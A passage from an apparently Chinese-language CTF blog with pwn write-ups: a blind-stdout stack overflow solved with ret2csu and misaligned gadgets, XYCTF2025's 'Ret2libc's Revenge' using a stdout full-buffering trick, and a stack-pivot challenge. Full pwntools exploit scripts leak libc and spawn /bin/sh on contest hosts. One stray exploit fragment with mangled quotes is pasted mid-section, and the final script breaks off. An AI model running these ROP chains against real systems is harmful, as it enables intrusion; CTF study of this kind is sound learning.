class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Close your eye, and you are blind now.&quot;</span>, <span class="number">0x26u</span>LL);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vuln函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显的栈溢出但是禁用了标准输出，但是2没有禁用（标准错误输出），我们可以调用write函数传2为第一个参数(文件描述符2表示标准错误输出)来泄露libc<br>然后write函数有三个参数，第三个参数rdx的控制片段较难寻找。此题中rdx因为此前程序自身调用了read函数读入0x200，我们知道rdx已经是0x200，可以直接使用<br>尽管如此我们还是分析一下一种控制rdx，同时也能控制rdi和rsi的方法，称为ret2csu<br>一般程序中都存在__libc_csu_init这个函数。在这个函数中，有如下片段(以此题为例)：</p><p>gadget1<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004012A0                 mov     rdx, r14</span><br><span class="line">.text:00000000004012A3                 mov     rsi, r13</span><br><span class="line">.text:00000000004012A6                 mov     edi, r12d</span><br><span class="line">.text:00000000004012A9                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">.text:00000000004012AD                 add     rbx, 1</span><br><span class="line">.text:00000000004012B1                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004012B4                 jnz     short loc_4012A0</span><br></pre></td></tr></table></figure><p>gadget2<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004012BA                 pop     rbx</span><br><span class="line">.text:00000000004012BB                 pop     rbp</span><br><span class="line">.text:00000000004012BC                 pop     r12</span><br><span class="line">.text:00000000004012BE                 pop     r13</span><br><span class="line">.text:00000000004012C0                 pop     r14</span><br><span class="line">.text:00000000004012C2                 pop     r15</span><br><span class="line">.text:00000000004012C4                 retn</span><br></pre></td></tr></table></figure><p>我们分析一下这两个片段就可以知道，通过gadget2中可传值的r14,r13,r12以及gadget1的前三条指令可以间接控制rdx,rsi,edi<br><br>在gadget2中，我们call了 [r15+rbx<em>8] ，将rbx置为0即 [r15+rbx</em>8] &#x3D;&#x3D; [r15]，方便我们用r15控制调用的函数。<br>后续add rbx, 1; cmp rbx, rbp; jnz xxxxxx。我们已经令rbx&#x3D;0，从而使r15+rbx*8&#x3D;r15，所以add rbx,1后rbx&#x3D;1，若此时rbp !&#x3D; 1，jnz触发可能会产生错误，为了避免不必要的麻烦，我们令rbp也为1（gadget2可以控制rbp）。最后我们把目标函数地址传入r15，也就成功劫持了程序执行流。<br>除了这种通用的方法以外，还有一个巧妙的方法,gadget2中其实隐藏了两个简单的gadget<br>pop r15;ret的机器码转为16进制为(0x41 0x5F 0xC3)，而pop rdi;ret的机器码为(0x5F 0xC3),后两个字节一模一样，说明pop r15;ret指令可以通过控制指令开始的地址变为pop rdi;ret。以此题为例子，pop r15的地址是0x4012C2，那么pop rdi的地址是pop r15的地址加一，即0x4012C3<br>同理我们看pop r14的机器码为（0x41 0x5E），而pop rsi的机器码正好为0x5E，以此题为例，pop r14的地址(0x4012C0)加一就是pop rsi指令的地址，也就是0x4012C1。<br>这两个隐藏gadget如何使用呢？以此题为例子，只需要布置rop链，ret到0x4012C1，也就是pop rsi，然后加上两个数据，分别pop进rsi和r15，然后ret到0x4012C3，也就是pop rdi，再加上要传入rdi的数据，再ret到目标函数即可。<br><br>话说回来，继续分析这个题目，在用write函数泄露libc并getshell后，标准输入还是禁用状态，我们需要输入指令exec 1&gt;&amp;0，将标准输出重定向到标准输入，在执行这个命令后，进程的标准输出将不再向终端屏幕上显示，而是会将输出结果发送到标准输入。这意味着，后续的输出会被作为输入来处理。相当于重启了标准输出。还可以通过调用dup2函数来重定向（搬运的解释，以后学IO_FILE再看看）<br>exp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn importi*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r=process(&#x27;./ywb_pwn&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;47.105.113.86&#x27;</span>,<span class="number">30003</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ywb_pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">write_plt=e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_add=<span class="number">0x401207</span></span><br><span class="line">pop_rdi=<span class="number">0x4012c3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4012c1</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(main_add)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Close your eye, and you are blind now.&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.send(payload.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">write_leak_add=u64(r.recv(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(write_leak_add))</span><br><span class="line">libcbase=write_leak_add-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_add)+p64(ret)+p64(sys_add)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.send(payload.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> ROP </category>
          
          <category> ret2libc </category>
          
          <category> ret2csu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2025</title>
      <link href="/2025/05/02/XYCTF2025/"/>
      <url>/2025/05/02/XYCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="Ret2libc’s-Revenge"><a href="#Ret2libc’s-Revenge" class="headerlink" title="Ret2libc’s Revenge"></a>Ret2libc’s Revenge</h2><h3 id="复现-ret2libc-全缓冲"><a href="#复现-ret2libc-全缓冲" class="headerlink" title="复现&#x2F;ret2libc&#x2F;全缓冲"></a>复现&#x2F;ret2libc&#x2F;全缓冲</h3><p>源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ret2libc&#x27;s Revenge&quot;</span>);</span><br><span class="line">  revenge();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">revenge</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">528</span>]; <span class="comment">// [rsp+0h] [rbp-220h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+210h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+217h] [rbp-9h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+21Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !feof(<span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v0 = v6++;</span><br><span class="line">    v5 = v0;</span><br><span class="line">    v2[v0] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = v6;</span><br><span class="line">  v2[v6] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为没有发现全缓冲，导致一直leak失败，其实其他思路都没有问题<br>打ret2libc，但是我们试运行程序时候发现当我们输入完之后才会输出Ret2libc’s Revenge，为什么？<br>原来setvbuf将stdout设置为了0，<strong>全缓冲模式，只有当输出缓冲区满了或者调用fflush函数才会输出内容</strong><br>我们这里没有fflush函数可以调用，于是只有填满缓冲区，我们找到text段的puts如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040128D                 lea     rdi, s          ; &quot;Ret2libc&#x27;s Revenge&quot;</span><br><span class="line">.text:0000000000401294                 call    _puts</span><br></pre></td></tr></table></figure><p>通过不断调用这一片段来不断填充输出缓冲区直至填满<br>注意我们构造payload时向栈中写入数据的索引v6也在栈上，当我们写入到v6的位置时，我们直接覆盖v6的低字节，以实现跳过。v6在rbp-4处，返回地址在rbp+8处，我们写入到v6时，v6为0x21c，我们写入一字节的0x28，将v6改为0x228，这样后续写入的字节便是直接从返回地址开始填充了<br>至于gadget的寻找，我们利用ROPgadget并没有找到可以直接控制rdi的片段，于是我们手动找到了可以间接控制rdi的片段<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401180                 mov     rdi, rsi</span><br><span class="line">.text:0000000000401183                 retn</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004010EB                 add     rsi, [rbp+20h]</span><br><span class="line">.text:00000000004010EF                 retn</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004010E4                 and     rsi, 0</span><br><span class="line">.text:00000000004010E8                 retn</span><br></pre></td></tr></table></figure><p>xxxxxxxxxx from pwn import*context.os&#x3D;’linux’context.arch&#x3D;’amd64’context.log_level&#x3D;’debug’libc&#x3D;ELF(‘.&#x2F;libc.so.6’)log.success(hex(libc.sym[“system”]-libc.sym[“printf”]))​r&#x3D;remote(‘125.220.147.47’,49761)​payload&#x3D;b”\x01”+p8(0x70)+b”\x05”+p8(0x80)payload+&#x3D;b”\x01\x07\x06\x81\x03”+b”\x05”+p8(0x81)payload+&#x3D;b”\x01\x01\x06\x82\x04”+b”\x05”+p8(0x82)payload+&#x3D;b”\x01s”+ b”\x05”+p8(0x0)+ b”\x01h”+ b”\x05”+p8(0x1)​r.sendlineafter(b”input length: “, str(len(payload)).encode())r.sendafter(b”input code: “, payload)r.interactive()python</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040117D                 pop     rbp</span><br><span class="line">.text:000000000040117E                 retn</span><br></pre></td></tr></table></figure><p>这些片段结合使用便可以控制rdi<br>缓冲区填满后直接常规泄露libc即可<br>exp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20605</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_add=<span class="number">0x40127b</span></span><br><span class="line">mov_rdi_rsi=<span class="number">0x401180</span></span><br><span class="line">add_rsi=<span class="number">0x4010eb</span></span><br><span class="line">and_rsi_0=<span class="number">0x4010e4</span></span><br><span class="line">ret=<span class="number">0x401150</span></span><br><span class="line">pop_rbp=<span class="number">0x40117d</span></span><br><span class="line">fake_rbp=<span class="number">0x400600</span>-<span class="number">0x20</span></span><br><span class="line">puts_str = <span class="number">0x40128D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">528</span>+<span class="number">12</span>)</span><br><span class="line">payload += p8(<span class="number">0x28</span>)</span><br><span class="line">payload += p64(puts_str)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">214</span>):</span><br><span class="line"> r.sendline(payload)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">540</span>+p8(<span class="number">0x28</span>)+p64(and_rsi_0)+p64(pop_rbp)+p64(fake_rbp)+p64(add_rsi)+p64(mov_rdi_rsi)+p64(puts_plt)+p64(ret)+p64(and_rsi_0)+p64(pop_rbp)+p64(fake_rbp)+p64(add_rsi)+p64(mov_rdi_rsi)+p64(puts_plt)+p64(main_add)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">215</span>):</span><br><span class="line"> r.recvuntil(<span class="string">b&quot;Ret2libc&#x27;s Revenge\n&quot;</span>)</span><br><span class="line">puts_add=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=puts_add-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">pop_rdi=libcbase+<span class="number">0x2a3e5</span></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">540</span>+p8(<span class="number">0x28</span>)+p64(pop_rdi)+p64(bin_add)+p64(ret)+p64(sys_add)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="明日方舟寻访模拟器"><a href="#明日方舟寻访模拟器" class="headerlink" title="明日方舟寻访模拟器"></a>明日方舟寻访模拟器</h2><h3 id="复盘-栈迁移-ROP"><a href="#复盘-栈迁移-ROP" class="headerlink" title="复盘&#x2F;栈迁移&#x2F;ROP"></a>复盘&#x2F;栈迁移&#x2F;ROP</h3><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">44</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+3Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402C68);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402CA0);</span><br><span class="line">          __isoc99_scanf(&amp;unk_402CE3, &amp;v6);</span><br><span class="line">          getchar();</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          employ(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        employ(<span class="number">10</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(&amp;byte_402CE6);</span><br><span class="line">      __isoc99_scanf(&amp;unk_402CE3, &amp;v4);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= <span class="number">0x2710</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          employ(v4);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402D0C);</span><br><span class="line">          getchar();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(&amp;byte_402CFF);</span><br><span class="line">        getchar();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_402D23);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    &amp;byte_402D38,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)ch_n,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)dword_405BE4,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)dword_405BE8,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)dword_405BEC);</span><br><span class="line">  __isoc99_scanf(&amp;unk_402CE3, &amp;v6);</span><br><span class="line">  <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_402DC6);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x60u</span>LL);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_402DDF);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, byte_402DEF);</span><br><span class="line">  v8 = <span class="number">50015</span>;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402E02);</span><br><span class="line">  system(<span class="string">&quot;echo bye~&quot;</span>);</span><br><span class="line">  v7 = <span class="string">&quot;null&quot;</span>;</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码的漏洞点在于最后的“向好友炫耀”（潜意思是晒欧不得好死吗）时输入名字时存在溢出，题目也有system函数<br>所以最后关键在于传入&#x2F;bin&#x2F;sh<br>我们看调用read函数时的汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     edx, 60h ; &#x27;`&#x27;  ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">call    _read</span><br></pre></td></tr></table></figure><p>发现读入数据的存放地址是rbp+s，这里s是-0x40，于是我们便可以在第一次read时候先填充垃圾数据直到rbp，然后覆盖rbp为target+0x40，这里target就是我们伪造的栈段的地址(函数结束时都会执行一次leave;ret，这时rbp的值也就变为了我们填充的target+0x40，后文有解释)<br>接着填充返回地址为调用read的地址以便第二次溢出<br>在第二次溢出时我们在target写入’&#x2F;bin&#x2F;sh\x00’，然后控制rdi指向这个target地址，也就指向了&#x2F;bin&#x2F;sh，然后接着写sys地址<br>接着继续填充到ebp，覆盖ebp为target，在返回地址填上leave_ret指令的地址，也就完成了<strong>栈迁移</strong><br><strong>leave_ret指令其实就是</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br><span class="line">pop rip</span><br></pre></td></tr></table></figure><p>其实最初我有疑惑在于我们修改了read的读入地址，第二次读入的数据便不在栈上了，后续填充ebp和返回地址以栈迁移是如何完成的呢？<br>后来我想到，<strong>在调用一个函数前，程序会先同步rsp和rbp，开辟新的栈帧，也就是执行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rbp,rsp</span><br></pre></td></tr></table></figure><p>在第一次调用结束后，return前会先leave ret一次，这时候rsp指向了rbp，也就是我们覆盖的target+0x40，接着pop rbp，rbp到了target+0x40处，再pop rip，执行我们填充的call_read，调用read函数时，先push rbp，也就是target+0x40入栈，再mov rbp，rsp，这时候rsp指向target+0x40，那么rbp也指向target+0x40，这时候我们发现rsp和rbp都指向target+0x40，接着rsp根据read函数的需求向低地址扩张，然后读入我们输入的数据。这时候我们发现我们已经在target附近伪造了一个栈<br>这时候我们再覆盖rbp为target，覆盖返回地址为leave_ret指令，函数返回时便会leave_ret两次，然后pop进rip的便是target+8处的指令了。也就实现了栈迁移劫持程序执行流<br>exp如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 